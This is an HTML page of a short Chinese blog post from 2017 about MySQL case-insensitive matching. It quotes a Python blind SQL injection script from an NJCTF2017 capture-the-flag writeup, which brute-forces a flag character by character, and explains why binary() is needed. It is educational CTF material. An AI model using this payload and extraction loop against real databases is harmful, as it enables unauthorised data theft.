@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>binary in Mysql | Haibin&#39;home</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="在看NJCTF2017的writeup的时候看到了
+1234567891011121314151617181920212223import requestsfrom urllib import quoteurl = &quot;http://218.2.197.235:23733/index.php?key=&quot;payload = &quot;\xc0&apos;||(select((flag))from(flag))like(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="binary in Mysql">
+<meta property="og:url" content="http://yoursite.com/2017/03/25/binary-in-Mysql/index.html">
+<meta property="og:site_name" content="Haibin'home">
+<meta property="og:description" content="在看NJCTF2017的writeup的时候看到了
+1234567891011121314151617181920212223import requestsfrom urllib import quoteurl = &quot;http://218.2.197.235:23733/index.php?key=&quot;payload = &quot;\xc0&apos;||(select((flag))from(flag))like(">
+<meta property="og:updated_time" content="2017-03-25T13:19:46.840Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="binary in Mysql">
+<meta name="twitter:description" content="在看NJCTF2017的writeup的时候看到了
+1234567891011121314151617181920212223import requestsfrom urllib import quoteurl = &quot;http://218.2.197.235:23733/index.php?key=&quot;payload = &quot;\xc0&apos;||(select((flag))from(flag))like(">
+  
+    <link rel="alternate" href="/atom.xml" title="Haibin&#39;home" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Haibin&#39;home</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-binary-in-Mysql" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/03/25/binary-in-Mysql/" class="article-date">
+  <time datetime="2017-03-25T13:15:44.000Z" itemprop="datePublished">2017-03-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      binary in Mysql
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在看NJCTF2017的writeup的时候看到了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from urllib import quote</div><div class="line"></div><div class="line">url = "http://218.2.197.235:23733/index.php?key="</div><div class="line">payload = "\xc0'||(<span class="keyword">select</span>((flag))<span class="keyword">from</span>(flag))<span class="keyword">like</span>(<span class="number">0</span>x%s)#<span class="string">"</span></div><div class="line">def check(str):</div><div class="line">    u = url + quote(payload % (str.encode("<span class="keyword">hex</span><span class="string">")))</span></div><div class="line">    ret = requests.get(u).content</div><div class="line">    return '002265' in ret</div><div class="line"></div><div class="line"></div><div class="line">ans = ""</div><div class="line"></div><div class="line">s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\<span class="string">'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</div><div class="line">        print ans</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">if</span> <span class="keyword">check</span>(ans + i + <span class="string">'%'</span>):</div><div class="line">                ans += i</div><div class="line">                break</div></pre></td></tr></table></figure>
+<p>其中， 这里<code>payload = &quot;\xc0&#39;||(select(binary(flag))from(flag))like(0x%s)#&quot;</code> 有一个<code>binary(flag)</code>, 查了下才知道原来<code>mysql</code>默认在查询的时候是不区分数据大小写的，需要加一个binary</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/03/25/binary-in-Mysql/" data-id="cj0v12pex000lm1pk6npcgtj6" class="article-share-link">Partager</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/03/25/NJCTF2017-login/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Récent</strong>
+      <div class="article-nav-title">
+        
+          NJCTF2017-login
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/03/25/FI/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Ancien</strong>
+      <div class="article-nav-title">FI</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Mot-clés</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cookie/">Cookie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RFI/">RFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/">Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/decode/">decode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/express/">express</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/handlebars/">handlebars</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/html/">html</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jsp/">jsp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/latex/">latex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node/">node</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/test/">test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/todo/">todo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vim/">vim</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/函数式/">函数式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周一/">周一</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周三/">周三</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周二/">周二</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周五/">周五</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周四/">周四</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周日/">周日</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/周末/">周末</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/国庆/">国庆</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/好久不见/">好久不见</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/好久不记/">好久不记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/好久不记东西/">好久不记东西</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/学习/">学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/寒假/">寒假</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/常用/">常用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Nuage de mot-clés</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/RFI/" style="font-size: 10px;">RFI</a> <a href="/tags/SQLi/" style="font-size: 12.5px;">SQLi</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Tomcat/" style="font-size: 10px;">Tomcat</a> <a href="/tags/decode/" style="font-size: 10px;">decode</a> <a href="/tags/express/" style="font-size: 10px;">express</a> <a href="/tags/handlebars/" style="font-size: 10px;">handlebars</a> <a href="/tags/html/" style="font-size: 10px;">html</a> <a href="/tags/java/" style="font-size: 15px;">java</a> <a href="/tags/javascript/" style="font-size: 10px;">javascript</a> <a href="/tags/jsp/" style="font-size: 10px;">jsp</a> <a href="/tags/latex/" style="font-size: 10px;">latex</a> <a href="/tags/node/" style="font-size: 10px;">node</a> <a href="/tags/test/" style="font-size: 10px;">test</a> <a href="/tags/todo/" style="font-size: 10px;">todo</a> <a href="/tags/vim/" style="font-size: 12.5px;">vim</a> <a href="/tags/web/" style="font-size: 17.5px;">web</a> <a href="/tags/函数式/" style="font-size: 10px;">函数式</a> <a href="/tags/周一/" style="font-size: 12.5px;">周一</a> <a href="/tags/周三/" style="font-size: 17.5px;">周三</a> <a href="/tags/周二/" style="font-size: 12.5px;">周二</a> <a href="/tags/周五/" style="font-size: 20px;">周五</a> <a href="/tags/周四/" style="font-size: 12.5px;">周四</a> <a href="/tags/周日/" style="font-size: 10px;">周日</a> <a href="/tags/周末/" style="font-size: 10px;">周末</a> <a href="/tags/国庆/" style="font-size: 10px;">国庆</a> <a href="/tags/好久不见/" style="font-size: 10px;">好久不见</a> <a href="/tags/好久不记/" style="font-size: 10px;">好久不记</a> <a href="/tags/好久不记东西/" style="font-size: 10px;">好久不记东西</a> <a href="/tags/学习/" style="font-size: 10px;">学习</a> <a href="/tags/寒假/" style="font-size: 10px;">寒假</a> <a href="/tags/常用/" style="font-size: 12.5px;">常用</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Articles récents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/03/29/html-js-decode/">html &amp; js - decode</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/25/NJCTF2017-login/">NJCTF2017-login</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/25/binary-in-Mysql/">binary in Mysql</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/25/FI/">FI</a>
+          </li>
+        
+          <li>
+            <a href="/2017/03/25/权限/">权限</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Haibin<br>
+      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
